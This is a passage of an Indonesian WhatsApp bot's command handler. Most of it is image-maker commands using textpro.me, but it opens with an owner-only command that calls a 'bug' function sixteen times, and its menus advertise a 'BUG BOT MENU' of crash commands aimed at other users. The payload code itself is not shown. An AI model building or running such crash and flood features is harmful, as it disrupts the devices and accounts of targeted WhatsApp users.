if (!isCreator) return m.reply(`Khusus Owner`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
anjay(`NihBug`)
break
/*case 'menu':
case 'help':
case 'bugmenu':{
var monospace = '```'
var faxx = await hisoka.fetchStatus(m.sender)
var l = 1
		   let dateIslamic = Intl.DateTimeFormat('id' + '-TN-u-ca-islamic', {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    }).format(d)
hisoka.sendMessage(from, {
    caption: `Hi User ${pushname}

*• 🍬 Date Islamic* _${dateIslamic}_
      *_Wib_* : _${wib}_
      *_Wita_* : _${wita}_
      *_Wit_* : _${wit}_


*Runtime Bot*
_*- ${runtime(process.uptime())}*_

*Online WhatsApp*
Os-Time : ${runtime(os.uptime())}

            👺 *OTHER MENU*

                 *ℒ⃝🐋 • afk*
                 *ℒ⃝🐋 • anticall* on/off
                 *ℒ⃝🐋 • self / public*
                 *ℒ⃝🐋 • nowa*

            😈 *CONVERT MENU*

                 *ℒ⃝🐋 • sticker*
                 *ℒ⃝🐋 • emojimix*
                 *ℒ⃝🐋 • emojimix2*
                 *ℒ⃝🐋 • stickmeme*  <text>| <text>
                 *ℒ⃝🐋 • ttp* <text>
                 *ℒ⃝🐋 • attp* <text>
                 *ℒ⃝🐋 • toimage*
                 *ℒ⃝🐋 • dbinary*
                 *ℒ⃝🐋 • ebinary*
                 *ℒ⃝🐋 • tovideo*

             👿 *RAMDOM MENU*

                 *ℒ⃝🐋 • patrick*
                 *ℒ⃝🐋 • dogestick*
                 *ℒ⃝🐋 • bucinstick*
                 *ℒ⃝🐋 • gurastick*

            🔥 *BUG BOT MENU*
            
                 *ℒ⃝🐋 • butto*
                 *ℒ⃝🐋 • stikto*
                 *ℒ⃝🐋 • catalogbug*
                 *ℒ⃝🐋 • bugvn*
                 *ℒ⃝🐋 • bugdoc*
                 *ℒ⃝🐋 • momo*
                 *ℒ⃝🐋 • momoto*
                 *ℒ⃝🐋 • gasmomo*
                 *ℒ⃝🐋 • gasinfinite*
                 *ℒ⃝🐋 • infinite*
                 *ℒ⃝🐋 • infiniteto*
                 *ℒ⃝🐋 • gassantet*
                 *ℒ⃝🐋 • santet*
                 *ℒ⃝🐋 • santetto*
                 *ℒ⃝🐋 • faraxxbug*
                 *ℒ⃝🐋 • vanfax*
                 *ℒ⃝🐋 • faraxxbug*
                 *ℒ⃝🐋 • faxxbugx*
                 *ℒ⃝🐋 • vanfax*
                 *ℒ⃝🐋 • crashcok*
                 *ℒ⃝🐋 • four*
                 *ℒ⃝🐋 • hihi*
                 *ℒ⃝🐋 • crashcok*

*🚨* *WARNING*
Aquí les agradezco por usar este bot, este bot aún está en desarrollo y este bot está equipado con la función Seguridad y gracias por ayudarme especialmente Vannes 

*-Thanks For*
*- Fax Faraxx ( Fardan )*
*- Santi*
`,
    image: fs.readFileSync("./lib/thum.jpg"),
    buttons: [
      {
       buttonId: `owner`, 
       buttonText: {
        displayText: 'Contact Owner'
      }, type: 1},
      {
       buttonId: `ping`, 
       buttonText: {
        displayText: 'Speed To Bot'
      }, type: 2}
    ],
    footer: "By Fax Faraxxx",
                contextInfo: {
"externalAdReply": { 
"title" : global.ownername,
"mediaType" : 1,
"renderLargerThumbnail" : true , 
"showAdAttribution": true, 
"jpegThumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"mediaUrl": global.linkgrupss, 
"thumbnail": fs.readFileSync("./lib/thumb2.jpg"),
"sourceUrl" : global.linkgrupss 
}}
           },{ quoted : m })
           }
  break*/
  
 case 'command':
 l = 1
 m.reply(`
*╔❏* ALL MENU
*╠❏* ${l++}. ➭ ${prefix}afk
*╠❏* ${l++}. ➭ ${prefix}anticall on/off
*╠❏* ${l++}. ➭ ${prefix}public
*╠❏* ${l++}. ➭ ${prefix}self
*╠❏* ${l++}. ➭ ${prefix}nowa 6281523xxxx
*╠❏* ${l++}. ➭ ${prefix}hidetagp
*╠❏* ${l++}. ➭ ${prefix}setppbot
*╠❏* ${l++}. ➭ ${prefix}setppbot /full
*╠❏* ${l++}. ➭ ${prefix}sticker
*╠❏* ${l++}. ➭ ${prefix}emojimix
*╠❏* ${l++}. ➭ ${prefix}asupan
*╠❏* ${l++}. ➭ ${prefix}meme
*╠❏* ${l++}. ➭ ${prefix}emojimix2
*╠❏* ${l++}. ➭ ${prefix}stickmeme
*╠❏* ${l++}. ➭ ${prefix}attp
*╠❏* ${l++}. ➭ ${prefix}ttp
*╠❏* ${l++}. ➭ ${prefix}toimage
*╠❏* ${l++}. ➭ ${prefix}ebinary
*╠❏* ${l++}. ➭ ${prefix}dbinary
*╠❏* ${l++}. ➭ ${prefix}tovideo
*╠❏* ${l++}. ➭ ${prefix}patrick
*╠❏* ${l++}. ➭ ${prefix}dogestick
*╠❏* ${l++}. ➭ ${prefix}bucinstick
*╠❏* ${l++}. ➭ ${prefix}gurastick
*╠❏* ${l++}. ➭ ${prefix}hoorror
*╠❏* ${l++}. ➭ ${prefix}whitebear
*╠❏* ${l++}. ➭ ${prefix}thunder
*╠❏* ${l++}. ➭ ${prefix}matrix
*╠❏* ${l++}. ➭ ${prefix}joker
*╠❏* ${l++}. ➭ ${prefix}magma
*╠❏* ${l++}. ➭ ${prefix}sand
*╠❏* ${l++}. ➭ ${prefix}metallic
*╠❏* ${l++}. ➭ ${prefix}graffiti
*╠❏* ${l++}. ➭ ${prefix}harrypotter
*╠❏* ${l++}. ➭ ${prefix}steel
*╠❏* ${l++}. ➭ ${prefix}underwater
*╠❏* ${l++}. ➭ ${prefix}luxury
*╠❏* ${l++}. ➭ ${prefix}pencil
*╠❏* ${l++}. ➭ ${prefix}sky
*╠❏* ${l++}. ➭ ${prefix}marvel
*╠❏* ${l++}. ➭ ${prefix}neon
*╠❏* ${l++}. ➭ ${prefix}rainbow
*╠❏* ${l++}. ➭ ${prefix}butto
*╠❏* ${l++}. ➭ ${prefix}stikto
*╠❏* ${l++}. ➭ ${prefix}catalogbug
*╠❏* ${l++}. ➭ ${prefix}bugvn
*╠❏* ${l++}. ➭ ${prefix}bugdoc
*╠❏* ${l++}. ➭ ${prefix}bugdocv2
*╠❏* ${l++}. ➭ ${prefix}momo
*╠❏* ${l++}. ➭ ${prefix}momoto
*╠❏* ${l++}. ➭ ${prefix}gasmomo
*╠❏* ${l++}. ➭ ${prefix}gasinfinite
*╠❏* ${l++}. ➭ ${prefix}infinite
*╠❏* ${l++}. ➭ ${prefix}infiniteto
*╠❏* ${l++}. ➭ ${prefix}gassantet
*╠❏* ${l++}. ➭ ${prefix}santet
*╠❏* ${l++}. ➭ ${prefix}santetto
*╠❏* ${l++}. ➭ ${prefix}faraxxbug
*╠❏* ${l++}. ➭ ${prefix}vanfax
*╠❏* ${l++}. ➭ ${prefix}faraxxbug
*╠❏* ${l++}. ➭ ${prefix}faxxbugx
*╠❏* ${l++}. ➭ ${prefix}vanfax
*╠❏* ${l++}. ➭ ${prefix}crashcok
*╠❏* ${l++}. ➭ ${prefix}four
*╠❏* ${l++}. ➭ ${prefix}hihi
*╠❏* ${l++}. ➭ ${prefix}crashcok
*╠❏* ${l++}. ➭ ${prefix}gashello
*╠❏* ${l++}. ➭ ${prefix}tengkorakto
*╠❏* ${l++}. ➭ ${prefix}tengkorak
*╠❏* ${l++}. ➭ ${prefix}gastengkorak
*╠❏* ${l++}. ➭ ${prefix}santetto
*╠❏* ${l++}. ➭ ${prefix}jadibug <reply sticker>
*╠❏* ${l++}. ➭ ${prefix}jadibug2
*╠❏* ${l++}. ➭ ${prefix}bugpoll
*╠❏* ${l++}. ➭ ${prefix}buglist <jumlah>
*╚❏* ${l++}. ➭ ${prefix}owner`)
break

  case 'menu':{
  		   let dateIslamic = Intl.DateTimeFormat('id' + '-TN-u-ca-islamic', {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    }).format(d)
var user = global.db.data.users[m.sender]
try {
ppuser = await hisoka.profilePictureUrl(m.sender, 'image')
} catch {
ppuser = 'https://tinyurl.com/yx93l6da'
}
lier = `꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝ ꒦ ͝ ꒷ ͝

         『 *👿DARKEST BOT👿* 』

         *Hi User ${pushname}*

*• 🍬 Date Islamic* _${dateIslamic}_
      *_Wib_* : _${wib}_
      *_Wita_* : _${wita}_
      *_Wit_* : _${wit}_


*⫹⫺ Runtime Bot*
_*- ${runtime(process.uptime())}*_

*⫹⫺ Online WhatsApp*
Os-Time : ${runtime(os.uptime())}

            『 *OWNER MENU* 』
            
                 *ℒ⃝🧭 • setexif*
                 *ℒ⃝🧭 • promote*
                 *ℒ⃝🧭 • demote*
                 *ℒ⃝🧭 • add*
                 *ℒ⃝🧭 • kick*
                 *ℒ⃝🧭 • addupdate*
                 *ℒ⃝🧭 • unblock*
                 *ℒ⃝🧭 • block*
                 *ℒ⃝🧭 • join*
                 
            『 *MEDIA MENU* 』

                 *ℒ⃝🐤 • ssweb <link>*
                 *ℒ⃝🐤 • translate*
                 *ℒ⃝🐤 • tourl*

            『 *OTHER MENU* 』

                 *ℒ⃝🍅 • afk*
                 *ℒ⃝🍅 • owner*
                 *ℒ⃝🍅 • self / public*
                 *ℒ⃝🍅 • nowa*
                 *ℒ⃝🍅 • hidetagp* teks
                 *ℒ⃝🍅 • setppbot*
                 *ℒ⃝🍅 • setppbot /full*
                 *ℒ⃝🍅 • report* Alasan

            『 *CONVERT MENU* 』

                 *ℒ⃝🐋 • sticker*
                 *ℒ⃝🐋 • emojimix*
                 *ℒ⃝🐋 • emojimix2*
                 *ℒ⃝🐋 • stickmeme*  <text>| <text>
                 *ℒ⃝🐋 • ttp* <text>
                 *ℒ⃝🐋 • attp* <text>
                 *ℒ⃝🐋 • toimage*
                 *ℒ⃝🐋 • dbinary*
                 *ℒ⃝🐋 • ebinary*
                 *ℒ⃝🐋 • tovideo*
                 
            『 *HAPPY MENU* 』
            
                 *ℒ⃝🍒 • cekmati*
                 *ℒ⃝🍒 • wangy*
                 *ℒ⃝🍒 • cekgay*
                 *ℒ⃝🍒 • lesbicek*
                 *ℒ⃝🍒 • cekcantik*
                 *ℒ⃝🍒 • cekganteng*
                 *ℒ⃝🍒 • sangecek*
                 *ℒ⃝🍒 • kapankah*
                 *ℒ⃝🍒 • apakah*
                 *ℒ⃝🍒 • bagaimanakah*
                 *ℒ⃝🍒 • bisakah*
                 *ℒ⃝🍒 • rate*

             『 *RAMDOM MENU* 』

                 *ℒ⃝🌐 • patrick*
                 *ℒ⃝🌐 • dogestick*
                 *ℒ⃝🌐 • asupan*
                 *ℒ⃝🌐 • bucinstick*
                 *ℒ⃝🌐 • gurastick*

            『 *MAKER MENU* 』
            
                 *ℒ⃝💫• hoorror*
                 *ℒ⃝💫• whitebear*
                 *ℒ⃝💫• thunder*
                 *ℒ⃝💫• matrix*
                 *ℒ⃝💫• joker*
                 *ℒ⃝💫• magma*
                 *ℒ⃝💫• sand*
                 *ℒ⃝💫• metallic*
                 *ℒ⃝💫• graffiti*
                 *ℒ⃝💫• harrypotter*
                 *ℒ⃝💫• steel*
                 *ℒ⃝💫• underwater*
                 *ℒ⃝💫• luxury*
                 *ℒ⃝💫• pencil*
                 *ℒ⃝💫• sky*
                 *ℒ⃝💫• marvel*
                 *ℒ⃝💫• neon*
                 *ℒ⃝💫• rainbow*
                 *ℒ⃝💫• retro*
                 *ℒ⃝💫• pornhub*
                 *ℒ⃝💫• sketch*
                 *ℒ⃝💫• juice*
                 *ℒ⃝💫• batman*
                 *ℒ⃝💫• wonderful*
                 *ℒ⃝💫• cool*
                 *ℒ⃝💫• collwall*
                 
            『 *BUG BOT MENU* 』
            
                 *ℒ⃝💈 • buglink*
                 *ℒ⃝💈 • butto*
                 *ℒ⃝💈 • stikto*
                 *ℒ⃝💈 • catalogbug*
                 *ℒ⃝💈 • bugvn*
                 *ℒ⃝💈 • bugdoc*
                 *ℒ⃝💈 • bugdocv2*
                 *ℒ⃝💈 • momo*
                 *ℒ⃝💈 • momoto*
                 *ℒ⃝💈 • gasmomo*
                 *ℒ⃝💈 • gasinfinite*
                 *ℒ⃝💈 • infinite*
                 *ℒ⃝💈 • infiniteto*
                 *ℒ⃝💈 • gassantet*
                 *ℒ⃝💈 • santet*
                 *ℒ⃝💈 • santetto*
                 *ℒ⃝💈 • faraxxbug*
                 *ℒ⃝💈 • vanfax*
                 *ℒ⃝💈 • faraxxbug*
                 *ℒ⃝💈 • faxxbugx*
                 *ℒ⃝💈 • vanfax*
                 *ℒ⃝💈 • crashcok*
                 *ℒ⃝💈 • four*
                 *ℒ⃝💈 • hihi*
                 *ℒ⃝💈 • crashcok*
                 *ℒ⃝💈 • gashello*
                 *ℒ⃝💈 • tengkorakto*
                 *ℒ⃝💈 • tengkorak*
                 *ℒ⃝💈 • gastengkorak*
                 *ℒ⃝💈 • santetto*
                 *ℒ⃝💈 • jadibug* <reply sticker>
                 *ℒ⃝💈 • jadibug2*
                 *ℒ⃝💈 • bugpoll*
                 *ℒ⃝💈 • buglist* <jumlah>
                 

⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

*🚨* *WARNING*
Aquí les agradezco por usar este bot, este bot aún está en desarrollo y este bot está equipado con la función Seguridad y gracias por ayudarme especialmente Vannes 

*-Thanks For*
*=> Fax Faraxx ( Fardan )*
*=> Rekxi*

_*By*_ *@${owner[0].split('@')[0]}*`
var button = [{ buttonId: `ping`, buttonText: { displayText: `To Speed Bot` }, type: 1 }]
loh = await hisoka.sendMessage(m.chat, { caption: `${lier}`, location: { jpegThumbnail: await reSize(ppuser, 300, 300) }, buttons: button, footer: `Fax Faraxx`, mentions: parseMention(lier) })
await sleep(500)
let sections = [
{
title: "Information about Bot",
rows: [
{title: "Rules Bot", rowId: `rules`, description: `Click this button if you want to use bots well`},
{title: "Official Owner", rowId: `infobotowner`, description: `If You Want to Ask a Bot ? Click here`},
{title: "SourceCode", rowId: `sc`, description: `Want to know the Sc in use Click`},
]
},
]
hisoka.sendListMsg(m.chat, `An automated system (WhatsApp Bot) that can help to do something, search and get data/information only through WhatsApp`, '', '', `Tap!`, sections, loh)
}
break
case 'sc':{
m.reply(`https://youtube.com/c/FaxFaraxx354`)
}
break
case 'hoorror':{
     let link = `https://textpro.me/horror-blood-text-effect-online-883.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
  case 'whitebear':{  
     let link = `https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'thunder':{
     let link = `https://textpro.me/create-thunder-text-effect-online-881.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'neon':{
     let link = `https://textpro.me/neon-light-text-effect-online-882.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'matrix':{
     let link = `https://textpro.me/matrix-style-text-effect-online-884.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'sky':{
     let link = `https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'joker':{
     let link = `https://textpro.me/create-logo-joker-online-934.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'magma':{
     let link = `https://textpro.me/create-a-magma-hot-text-effect-online-1030.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'sand':{
     let link = `https://textpro.me/sand-writing-text-effect-online-990.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'pencil':{
     let link = `https://textpro.me/create-a-sketch-text-effect-online-1044.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'graffiti':{
     let link = `https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'metallic':{
     let link = `https://textpro.me/create-a-metallic-text-effect-free-online-1041.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'steel':{
     let link = `https://textpro.me/steel-text-effect-online-921.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'harrypotter':{
     let link = `https://textpro.me/create-harry-potter-text-effect-online-1025.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'underwater':{
     let link = `https://textpro.me/3d-underwater-text-effect-generator-online-1013.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'luxury':{
     let link = `https://textpro.me/3d-luxury-gold-text-effect-online-1003.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'glue':{
     let link = `https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'fabric':{
     let link = `https://textpro.me/fabric-text-effect-online-964.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'neonlight':{
     let link = `https://textpro.me/neon-light-glitch-text-generator-online-1063.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'lava':{
     let link = `https://textpro.me/lava-text-effect-online-914.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'toxic':{
     let link = `https://textpro.me/toxic-text-effect-online-901.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'ancient':{
     let link = `https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'christmas':{
     let link = `https://textpro.me/sparkles-merry-christmas-text-effect-1054.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'sci_fi':{
     let link = `https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'rainbow':{
     let link = `https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html`
     let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
//BARU
case 'classic':{
let link = `https://textpro.me/video-game-classic-8-bit-text-effect-1037.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'watercolor':{
let link = `https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'halloween':{
let link = `https://textpro.me/create-a-spooky-halloween-text-effect-online-1046.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'halloweenfire':{
let link = `https://textpro.me/halloween-fire-text-effect-940.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'writing':{
let link = `https://textpro.me/sand-writing-text-effect-online-990.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'foggy':{
let link = `https://textpro.me/write-text-on-foggy-window-online-free-1015.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'marvel':{
let link = `https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'skeleton':{
let link = `https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'sketch':{
let link = `https://textpro.me/create-a-sketch-text-effect-online-1044.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'wonderful':{
let link = `https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'cool':{
let link = `https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'collwall':{
let link = `https://textpro.me/create-cool-wall-graffiti-text-effect-online-1009.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'multicolor':{

let link = `https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'batman':{
let link = `https://textpro.me/make-a-batman-logo-online-free-1066.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
case 'juice':{
let link = `https://textpro.me/fruit-juice-text-effect-861.html`
let anui = await textpro(link, q)
     m.reply(`Tunggu Sebentar Sedang Membuat Makernya Sekitar 1 Menit Kurang`) 
     console.log(anui)
    hisoka.sendMessage(from, {image:{url:anui}, caption:"Done!"}, {quoted:m})
}
   break
//WM By Rizki
case 'pornhub':{

if(!q) return m.reply(`Example: ${prefix + command} ajg | ea`)
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
console.log(anu)
hisoka.sendMessage(from,{image:{url:anu}, caption:"Done!"},{quoted:m})
}
break
case 'retro':{

if(!q) return m.reply(`Example: ${prefix + command} ajg | ea`)
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/create-3d-retro-text-effect-online-free-1065.html", [`${logo4}`,`${logo9}`])
console.log(anu)
hisoka.sendMessage(from,{image:{url:anu}, caption:"Done!"},{quoted:m})
}
break
case 'horror':{

if(!q) return m.reply(`Example: ${prefix + command} ajg | ea`)
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/create-a-cinematic-horror-text-effect-1045.html", [`${logo4}`,`${logo9}`])
console.log(anu)
hisoka.sendMessage(from,{image:{url:anu}, caption:"Done!"},{quoted:m})
}
break
case '8bit':{

if(!q) return m.reply(`Example: ${prefix + command} ajg | ea`)
m.reply(mess.wait)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/video-game-classic-8-bit-text-effect-1037.html", [`${logo4}`,`${logo9}`])
console.log(anu)
hisoka.sendMessage(from,{image:{url:anu}, caption:"Done!"},{quoted:m})
}
break
case 'infobotowner':
m.reply(`*Owner* is the owner of a bot (not a bot) so don't send a chat command to the owner number, try when the chat owner is only for important things such as buying quota packages or reporting bot features.`)
hisoka.sendContact(m.chat, global.owner, )
break
case 'rules':
